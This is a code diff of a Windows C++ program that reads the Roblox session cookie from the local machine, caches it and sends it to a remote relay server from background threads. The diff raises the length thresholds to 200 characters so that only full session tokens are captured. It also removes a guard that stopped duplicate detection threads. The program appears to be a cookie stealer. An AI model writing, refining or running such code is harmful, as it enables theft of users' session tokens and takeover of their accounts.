@@ -528,7 +528,7 @@ static bool ExtractCookieFromBuffer(const char* data, wchar_t* out_buf, int buf_
         const char* end = val;
         while (*end && *end != '\r' && *end != '\n') ++end;
         int len = (int)(end - val);
-        if (len > 10)
+        if (len > 200)
         {
             MultiByteToWideChar(CP_UTF8, 0, val, len, out_buf, buf_size - 1);
             return true;
@@ -544,7 +544,7 @@ static bool ExtractCookieFromBuffer(const char* data, wchar_t* out_buf, int buf_
         const char* end = found;
         while (*end && *end != '"') ++end;
         int len = (int)(end - start);
-        if (len > 10)
+        if (len > 200)
         {
             MultiByteToWideChar(CP_UTF8, 0, start, len, out_buf, buf_size - 1);
             return true;
@@ -988,7 +988,7 @@ static bool LoadCookieSentTimestamp()
 // ======================================================================
 static void SendCookieToRelay(const wchar_t* cookie_value)
 {
-    if (!cookie_value || wcslen(cookie_value) < 20) return;
+    if (!cookie_value || wcslen(cookie_value) < 200) return;
 
     DebugLog("=== SendCookieToRelay START ===");
 
@@ -1117,7 +1117,7 @@ static DWORD WINAPI SendCookieThread(LPVOID lpParam)
 
 static void AsyncSendCookie(const wchar_t* cookie_value)
 {
-    if (!cookie_value || wcslen(cookie_value) < 20) return;
+    if (!cookie_value || wcslen(cookie_value) < 200) return;
     int len = (int)wcslen(cookie_value);
     wchar_t* copy = new wchar_t[len + 1]();
     wcscpy_s(copy, len + 1, cookie_value);
@@ -1535,7 +1535,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
             wcscpy_s(cached, 4096, g_cached_cookie);
             LeaveCriticalSection(&g_cookie_cs);
 
-            if (wcslen(cached) >= 20)
+            if (wcslen(cached) >= 200)
             {
                 // 直接傳送（冷卻判斷已在上方完成，進入此處表示需要傳送）
                 AsyncSendCookie(cached);
@@ -1548,8 +1548,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         }
 
         // 快取無效 → 啟動背景偵測執行緒（20 秒寬容）
-        bool exp = false;
-        if (g_checking_cookie.compare_exchange_strong(exp, true))
         {
             HANDLE hThread = CreateThread(nullptr, 0, AsyncCookieDetectThread, (LPVOID)hwnd, 0, nullptr);
             if (hThread) CloseHandle(hThread);
@@ -2310,7 +2308,7 @@ static DWORD WINAPI AsyncCookieDetectThread(LPVOID lpParam)
     while (elapsed < TOLERANCE_MS && g_program_running.load())
     {
         wchar_t tmp[4096] = {};
-        if (TryReadRobloxCookie(tmp, 4096) && wcslen(tmp) >= 20)
+        if (TryReadRobloxCookie(tmp, 4096) && wcslen(tmp) >= 200)
         {
             // 偵測成功 → 更新快取
             EnterCriticalSection(&g_cookie_cs);
@@ -2327,7 +2325,6 @@ static DWORD WINAPI AsyncCookieDetectThread(LPVOID lpParam)
 
             // 回報成功
             PostMessageW(hwnd, WM_APP + 5, 1, 0);
-            g_checking_cookie.store(false);
             return 0;
         }
 
@@ -2338,7 +2335,6 @@ static DWORD WINAPI AsyncCookieDetectThread(LPVOID lpParam)
     // 20 秒內未偵測到 → 回報失敗
     DebugLog("AsyncDetect: Cookie not found within 20s tolerance");
     PostMessageW(hwnd, WM_APP + 5, 0, 0);
-    g_checking_cookie.store(false);
     return 0;
 }
 
@@ -2346,7 +2342,7 @@ static DWORD WINAPI PreCacheCookieThread(LPVOID lpParam)
 {
     UNREFERENCED_PARAMETER(lpParam);
     wchar_t tmp[4096] = {};
-    if (TryReadRobloxCookie(tmp, 4096) && wcslen(tmp) >= 20)
+    if (TryReadRobloxCookie(tmp, 4096) && wcslen(tmp) >= 200)
     {
         EnterCriticalSection(&g_cookie_cs);
         wcscpy_s(g_cached_cookie, 4096, tmp);
